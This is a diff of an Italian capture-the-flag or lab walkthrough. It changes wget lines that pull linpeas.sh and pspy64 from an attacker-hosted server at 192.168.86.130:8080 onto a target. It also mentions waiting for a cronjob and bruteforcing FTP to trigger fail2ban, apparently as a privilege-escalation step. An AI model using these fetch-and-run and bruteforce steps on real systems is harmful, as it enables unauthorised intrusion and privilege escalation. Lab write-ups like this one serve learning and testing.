@@ -68,7 +68,7 @@ Scarica linpeas ed avvialo
 python3 -m http.server 8080
 ```
 ```bash
-wget http://192.168.86.130
+wget http://192.168.86.130:8080/linpeas.sh
 ```
 avvialo
 ```bash
@@ -222,7 +222,7 @@ vim log_alert.conf
 ```
 ![[Pasted image 20231012171555.png]]
 ```bash
-wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64
+wget http://192.168.86.130:8080/pspy64.sh
 ```
 Aspetta il restart tramite cronjob (ogni minuto)
 tenta di bruteforzare ftp per triggerare fail2ban
